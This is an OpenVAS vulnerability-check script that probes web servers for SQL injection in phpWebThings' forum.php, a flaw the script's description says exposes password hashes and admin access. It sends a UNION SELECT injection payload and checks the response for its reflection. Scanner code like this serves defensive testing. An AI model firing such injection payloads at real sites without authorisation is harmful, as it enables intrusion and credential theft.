# OpenVAS Vulnerability Test
# Description: phpWebThings forum Parameter SQL Injection Vulnerabilities
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2005 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20170");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2005-3585", "CVE-2005-4218");
  script_bugtraq_id(15276, 15465);
  script_name("phpWebThings forum Parameter SQL Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2005 Ferdy Riphagen");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2005-11/0057.html");
  script_xref(name:"URL", value:"http://retrogod.altervista.org/phpwebth14_xpl.html");
  script_xref(name:"URL", value:"http://www.ojvweb.nl/download.php?file=64&cat=17&subref=10");

  script_tag(name:"solution", value:"Apply the phpWebthings 1.4 forum patch referenced in the third URL
  above.");

  script_tag(name:"summary", value:"The version of phpWebThings installed on the remote host does not
  properly sanitize user input in the 'forum' and 'msg' parameters of 'forum.php' script before using
  it in database queries.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to display the usernames and passwords
  (md5 hash) from the website and then use this information to gain administrative access to the affected application.");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port))
  exit(0);

foreach dir( make_list_unique( "/phpwebthings", "/webthings", "/phpwt", cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  exploit = "-1 UNION SELECT null,123456,null,null,null,null/*";

  url = string(dir, "/forum.php?forum=", urlencode(str:exploit));
  req = http_get(item:url, port:port);
  recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(!recv)
    continue;

  if ( string('<input type="hidden" value="', exploit, '" name="sforum"') >< recv &&
       egrep(pattern:"created with <a href=[^>]+.*>phpWebThings", string:recv) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );